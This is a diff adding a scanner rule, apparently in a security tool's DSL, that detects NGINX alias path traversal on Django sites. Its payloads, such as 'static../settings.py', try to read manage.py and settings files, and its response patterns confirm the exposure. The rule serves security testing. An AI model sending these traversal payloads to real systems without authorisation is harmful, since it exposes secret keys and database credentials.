@@ -1,0 +1,61 @@
+#Attention! For this DSL detect you must use a custom test policy with URI_.* insertion point!
+meta-info:
+  - type: ptrav
+  - threat: 70
+  - tags:
+    - Django
+    - NGINX alias traversal
+    - Misconfiguration
+    - Path Traversal
+
+collect:
+ - uniq:
+   - [ HEADER_HOST ]
+
+generate:
+  - into: URI
+  - method:
+    - replace
+  - payload:
+    - 'static../manage.py'
+    - 'media../manage.py'
+    - 'uploads../manage.py'
+
+    - 'static../__init__.py'
+    - 'media../__init__.py'
+    - 'uploads../__init__.py'
+
+    - 'static../settings.py'
+    - 'media../settings.py'
+    - 'uploads../settings.py'
+
+    - 'static../apps/settings.py'
+    - 'media../apps/settings.py'
+    - 'uploads../apps/settings.py'
+
+    - 'static../dev/settings.py'
+    - 'media../dev/settings.py'
+    - 'uploads../dev/settings.py'
+
+    - 'static../production/settings.py'
+    - 'media../production/settings.py'
+    - 'uploads../production/settings.py'
+
+    - 'static../project/settings.py'
+    - 'media../project/settings.py'
+    - 'uploads../project/settings.py'
+
+    - 'static../mysite/settings.py'
+    - 'media../mysite/settings.py'
+    - 'uploads../mysite/settings.py'
+
+    - 'static../website/settings.py'
+    - 'media../website/settings.py'
+    - 'uploads../website/settings.py'
+
+detect:
+  - response:
+    - body: 'from django\.core\.management import execute_from_command_line'
+    - body: 'from django.* import'
+    - body: '''django\.contrib\.staticfiles'','
+
